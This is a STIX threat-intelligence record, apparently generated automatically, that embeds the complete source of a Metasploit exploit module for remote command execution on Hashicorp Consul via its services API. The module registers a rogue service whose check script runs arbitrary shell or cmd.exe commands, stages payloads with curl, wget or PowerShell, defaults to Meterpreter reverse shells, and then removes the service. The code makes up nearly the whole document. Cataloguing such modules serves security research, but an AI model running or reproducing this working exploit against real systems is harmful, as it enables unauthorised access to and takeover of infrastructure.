{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1835fc30-8ab9-4b19-b5f1-656edbb63ebc",
    "created": "2024-08-14T17:06:54.328061Z",
    "modified": "2024-08-14T17:06:54.328065Z",
    "name": "Hashicorp Consul Remote Command Execution via Services API",
    "description": " This module exploits Hashicorp Consul's services API to gain remote command execution on Consul nodes.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/consul_service_exec.rb",
            "external_id": "consul_service_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.consul.io/api/agent/service.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/torque59/Garfield"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Hashicorp Consul Remote Command Execution via Services API',\n        'Description' => %q{\n          This module exploits Hashicorp Consul's services API to gain remote command\n          execution on Consul nodes.\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'Bharadwaj Machiraju <bharadwaj.machiraju[at]gmail.com>', # Discovery and PoC\n            'Francis Alexander <helofrancis[at]gmail.com >', # Discovery and PoC\n            'Quentin Kaiser <kaiserquentin[at]gmail.com>', # Metasploit module\n            'Matthew Lucas <mattglucas97[at]gmail.com>' # Windows support for Metasploit module\n          ],\n        'References' =>\n          [\n            [ 'URL', 'https://www.consul.io/api/agent/service.html' ],\n            [ 'URL', 'https://github.com/torque59/Garfield' ]\n          ],\n        'Targets' =>\n          [\n            [\n              'Linux',\n              {\n                'Platform' => 'linux',\n                'CmdStagerFlavor' => ['bourne', 'echo', 'printf', 'curl', 'wget'],\n                'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n              }\n            ],\n            [\n              'Windows',\n              {\n                'Platform' => 'win',\n                'CmdStagerFlavor' => 'psh_invokewebrequest',\n                'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }\n              }\n            ]\n          ],\n        'Payload' => {},\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2018-08-11'\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path', '/']),\n        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]),\n        OptString.new('ACL_TOKEN', [false, 'Consul Agent ACL token', '']),\n        Opt::RPORT(8500)\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/v1/agent/self'),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      }\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      vprint_error 'Unexpected reply'\n      return CheckCode::Safe\n    end\n\n    agent_info = JSON.parse(res.body)\n\n    if agent_info['Config']['EnableScriptChecks'] == true || agent_info['DebugConfig']['EnableScriptChecks'] == true || agent_info['DebugConfig']['EnableRemoteScriptChecks'] == true\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  rescue JSON::ParserError\n    vprint_error 'Failed to parse JSON output.'\n    return CheckCode::Unknown\n  end\n\n  def execute_command(cmd, _opts = {})\n    uri = target_uri.path\n    service_name = Rex::Text.rand_text_alpha(5..10)\n    print_status(\"Creating service '#{service_name}'\")\n\n    # NOTE: Timeout defines how much time the check script will run until\n    # getting killed. Arbitrarily set to one day for now.\n    case target.name\n    when /Linux/\n      arg1 = 'sh'\n      arg2 = '-c'\n    when /Windows/\n      arg1 = 'cmd.exe'\n      arg2 = '/c'\n    end\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(uri, 'v1/agent/service/register'),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      },\n      'ctype' => 'application/json',\n      'data' => {\n        ID: service_name.to_s,\n        Name: service_name.to_s,\n        Address: '127.0.0.1',\n        Port: 80,\n        check: {\n          Args: [arg1, arg2, cmd.to_s],\n          interval: '10s',\n          Timeout: '86400s'\n        }\n      }.to_json\n    })\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'An error occured when contacting the Consul API.')\n    end\n    print_status(\"Service '#{service_name}' successfully created.\")\n    print_status(\"Waiting for service '#{service_name}' script to trigger\")\n    sleep(12)\n    print_status(\"Removing service '#{service_name}'\")\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(\n        uri,\n        \"v1/agent/service/deregister/#{service_name}\"\n      ),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      }\n    })\n    if res && res.code != 200\n      fail_with(Failure::UnexpectedReply,\n                'An error occured when contacting the Consul API.')\n    end\n  end\n\n  def exploit\n    execute_cmdstager\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-11",
    "x_mitre_platforms": [
        "win'"
    ]
}